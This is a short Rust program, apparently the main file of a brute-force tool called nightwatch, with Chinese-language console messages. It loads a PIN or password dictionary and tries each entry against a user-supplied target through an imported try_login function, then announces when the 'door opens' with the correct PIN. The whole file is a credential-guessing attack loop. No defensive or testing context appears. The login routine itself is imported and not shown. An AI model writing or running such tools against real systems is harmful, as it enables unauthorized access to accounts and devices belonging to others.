use nightwatch_core::{load_dict, parse_args, try_login};
use reqwest::blocking::Client;

fn main() {
    let (target, dict_path) = parse_args();
    let client = Client::new();
    let pins = load_dict(&dict_path);

    println!("目标: {}", target);
    println!("字典: {}", dict_path);
    println!("字典加载完成，共 {} 个密码，开始爆破...", pins.len());

    for (i, pin) in pins.iter().enumerate() {
        print!("[{}] 正在尝试: {} ... ", i + 1, pin);

        match try_login(&client, pin, &target) {
            Ok(true) => {
                println!(">>> 门开了！正确的 PIN 码是: {} <<<", pin);
                break;
            }
            Ok(false) => println!("错。继续。"),
            Err(e) => println!("网络炸了: {}，跳过这个继续下一个。", e),
        }
    }
}